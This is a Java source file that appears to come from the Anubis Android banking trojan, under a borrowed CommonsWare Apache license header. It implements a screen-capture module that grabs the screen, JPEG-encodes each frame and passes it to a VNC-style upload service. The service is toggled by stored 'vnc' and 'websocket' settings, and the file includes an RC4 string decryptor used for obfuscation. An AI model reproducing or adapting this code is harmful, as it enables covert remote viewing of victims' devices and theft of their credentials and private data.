/***
 Copyright (c) 2015 CommonsWare, LLC
 Licensed under the Apache License, Version 2.0 (the "License"); you may not
 use this file except in compliance with the License. You may obtain a copy
 of the License at http://www.apache.org/licenses/LICENSE-2.0. Unless required
 by applicable law or agreed to in writing, software distributed under the
 License is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS
 OF ANY KIND, either express or implied. See the License for the specific
 language governing permissions and limitations under the License.

 From _The Busy Coder's Guide to Android Development_
 https://commonsware.com/Android
 */

package anubis.bot.myapplication.API.Screenshot;

import android.annotation.TargetApi;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.graphics.Point;
import android.media.Image;
import android.media.ImageReader;
import android.os.Build;
import android.util.Base64;
import android.view.Display;
import android.view.Surface;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;

import anubis.bot.myapplication.API.ClassRC4;
import anubis.bot.myapplication.UtilsClass;

@TargetApi(Build.VERSION_CODES.LOLLIPOP)
public class ImageTransmogrifier implements ImageReader.OnImageAvailableListener {
  private final int width;
  private final int height;
  private final ImageReader imageReader;
  private final ServiceScreenshot svc;
  private Bitmap latestBitmap=null;
  UtilsClass utilsClass = new UtilsClass();

  public String str_decrypt(String textDE_C, String key)
  {
    UtilsClass utilsClass = new UtilsClass();
    try
    {
      byte[] data = Base64.decode(textDE_C, Base64.DEFAULT);
      textDE_C = new String(data, "UTF-8");
      byte[] detext = utilsClass.hexStringToByteArray(textDE_C);
      ClassRC4 rcd = new ClassRC4(key.getBytes());
      return  new String(rcd.decrypt(detext));
    }catch (Exception ex){ }
    return "";
  }


  ImageTransmogrifier(ServiceScreenshot svc) {
    this.svc=svc;
    Display display=svc.getWindowManager().getDefaultDisplay();
    Point size=new Point();

    display.getSize(size);
    int width=size.x;
    int height=size.y;
    if((width>0)&&(width<=800)){
       width=(size.x/2);
       height=(size.y/2);
    }else if((width>800)&&(width<=1600)){
      width=(size.x/3);
      height=(size.y/3);
    }else if(width>1600){
      width=(size.x/4);
      height=(size.y/4);
    }else{
      width=(size.x/2);
      height=(size.y/2);
    }

    while (width*height > (2<<19)) {
      width=width>>1;
      height=height>>1;
    }

    this.width=width;
    this.height=height;

    imageReader= ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
    imageReader.setOnImageAvailableListener(this, svc.getHandler());
  }

  @Override
  public void onImageAvailable(ImageReader reader) {
    final Image image=imageReader.acquireLatestImage();
    if (image!=null) {
      Image.Plane[] planes=image.getPlanes();
      ByteBuffer buffer=planes[0].getBuffer();
      int pixelStride=planes[0].getPixelStride();
      int rowStride=planes[0].getRowStride();
      int rowPadding=rowStride - pixelStride * width;
      int bitmapWidth=width + rowPadding / pixelStride;

      if (latestBitmap == null ||
          latestBitmap.getWidth() != bitmapWidth ||
          latestBitmap.getHeight() != height) {
        if (latestBitmap != null) {
          latestBitmap.recycle();
        }

        latestBitmap= Bitmap.createBitmap(bitmapWidth,
            height, Bitmap.Config.ARGB_8888);
      }

      latestBitmap.copyPixelsFromBuffer(buffer);

      if (image != null){
        image.close();
      }

      ByteArrayOutputStream baos=new ByteArrayOutputStream();
      Bitmap cropped= Bitmap.createBitmap(latestBitmap, 0, 0,
        width, height);

      cropped.compress(Bitmap.CompressFormat.JPEG, 100, baos);

   byte[] newJpg = baos.toByteArray();
      if((utilsClass.SetRead(svc,"vnc").equals("stop"))||(utilsClass.SetRead(svc,"websocket").equals(""))){
        svc.stopForeground(true);
        svc.stopService(svc.intent);
        return;
      }
      svc.processImage(newJpg);
      svc.startService(new Intent(svc, ServiceSendRequestImageVNC.class));
    }
  }

  Surface getSurface() {
    return(imageReader.getSurface());
  }

  int getWidth() {
    return(width);
  }

  int getHeight() {
    return(height);
  }

  void close() {
    imageReader.close();
  }



}
